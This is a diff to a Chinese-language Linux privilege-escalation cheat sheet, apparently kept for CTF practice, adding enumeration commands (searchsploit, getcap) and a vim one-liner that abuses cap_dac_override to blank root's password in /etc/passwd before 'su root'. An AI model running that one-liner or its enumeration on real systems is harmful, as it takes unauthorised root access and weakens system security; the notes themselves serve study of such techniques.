@@ -8,6 +8,8 @@ echo "a.txt b.txt" | xargs rm
 
 
 手工枚举命令：
+-v                                                                     看软件版本
+searchsploit -m "linux/local/41154.sh"                                 搜索 Exploit-DB 里的漏洞脚本
 ps au                                                                  查看进程，类似 find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
 ps aux
 ls /home
@@ -104,7 +106,9 @@ adm     能够读取存储在 /var/log 中的所有日志，不会授予 root �
         grep -rw "flag" /var/log 2>/dev/null
 
 
+权能，把 root 特权"拆开"
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;      枚举权能
 
-
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd      cap_dac_override 权能，清空了root的密码，接着 su root，交互式用 vim 改也行
 
 
